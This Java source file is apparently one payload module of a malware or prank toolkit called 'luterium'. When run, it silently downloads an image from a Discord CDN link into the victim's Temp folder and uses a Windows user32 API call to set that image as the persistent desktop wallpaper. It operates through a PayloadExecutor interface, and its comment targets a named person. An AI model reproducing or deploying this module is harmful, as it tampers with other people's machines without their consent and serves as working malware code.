package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import java.io.File;
import java.util.HashMap;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.WinDef.UINT_PTR;
import com.sun.jna.win32.*;
import dev.peter.luterium.utils.FileUtil;

/**
 * @author Peter
 * @since 09/16/2022
 * JohnShiozo's favorite wallpaper.
 */

public class ChangeWallpaper implements PayloadExecutor {
    Main main = new Main();
    FileUtil fileUtil = new FileUtil();

    @Override
    public void execute() throws Exception {
        File path = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\joaoshiozomoment.png");

        fileUtil.downloadFile("https://cdn.discordapp.com/attachments/983042411506847785/1020436119755702404/furry.png", path);

        SPI.INSTANCE.SystemParametersInfo(
                new UINT_PTR(SPI.SPI_SETDESKWALLPAPER),
                new UINT_PTR(0),
                String.valueOf(path),
                new UINT_PTR(SPI.SPIF_UPDATEINIFILE | SPI.SPIF_SENDWININICHANGE));
    }

    public interface SPI extends StdCallLibrary {

        //from MSDN article
        long SPI_SETDESKWALLPAPER = 20;
        long SPIF_UPDATEINIFILE = 0x01;
        long SPIF_SENDWININICHANGE = 0x02;

        SPI INSTANCE = (SPI) Native.loadLibrary("user32", SPI.class, new HashMap<Object, Object>() {
            {
                put(OPTION_TYPE_MAPPER, W32APITypeMapper.UNICODE);
                put(OPTION_FUNCTION_MAPPER, W32APIFunctionMapper.UNICODE);
            }
        });

        boolean SystemParametersInfo(
                UINT_PTR uiAction,
                UINT_PTR uiParam,
                String pvParam,
                UINT_PTR fWinIni
        );
    }
}
